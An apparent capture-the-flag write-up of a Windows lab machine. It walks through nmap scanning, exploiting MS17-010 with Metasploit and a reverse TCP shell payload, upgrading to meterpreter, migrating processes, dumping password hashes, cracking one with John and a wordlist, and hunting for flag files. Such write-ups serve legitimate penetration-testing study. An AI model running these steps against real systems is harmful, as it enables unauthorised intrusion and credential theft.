IP : 10.10.118.25

NMAP : sudo nmap -sV -sC -A -O -T4 10.10.118.25 > nmap.txt

NMAP : sudo nmap --script vuln 10.10.118.25  

Here I found Machine is Windows and it is vulnerable to MS17_010 RCE
> Host script results:
![image](https://github.com/MrKeral/Offensive-Pentesting-OSCP/assets/82687464/06efa503-58f6-4cbc-bc3e-93412c7e1ef2)

msfconsole <br>
> search ms17_010 <br>
use 0 <br>
set rhost 10.10.118.25 <br>
set lhost LOCAL-IP <br>
set payload windows/x64/shell/reverse_tcp <br>
exploit

Here I got the shell
> Shell <br>
![image](https://github.com/MrKeral/Offensive-Pentesting-OSCP/assets/82687464/2011d2e0-837c-4274-aa96-2d274bf629b8)

CTRL + Z for run session in background

Here I set the shell to meterpreter
> search shell_to_meterpreter <br>
use 0  <br>
set lhost LOCAL-IP <br>
set session 1 <br>
exploit <br>
session -i 2         # for meterpreter shell

Check  NT AUTHORITY\SYSTEM or not by using getsystem and getuid. I'm running as system but that doesn’t indicate that our process is. I need to migrate to another process. Generally we use services.exe
> migrate 692 <br>
> ![image](https://github.com/MrKeral/Offensive-Pentesting-OSCP/assets/82687464/530a695f-7484-43af-8086-3f9a2fd5f1bc)


Now check for Hashes
> hashdump <br>
> ![image](https://github.com/MrKeral/Offensive-Pentesting-OSCP/assets/82687464/920f4803-ee57-410c-a4c7-3d89b9450151)


Here I found Jon user with password hash.
> echo "Jon:1000:dfzhdfhdxghsfghjfxgjfjxfgjxfgjx:fgjxfgjxfgjxfgjhfghdg:::" > hash <br>
> john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash

Password is alqfna22

Now search for Flags
> search -f flag*.txt <br>
> ![image](https://github.com/MrKeral/Offensive-Pentesting-OSCP/assets/82687464/4f880b17-2214-4b46-83ab-7010a00f1f5e)

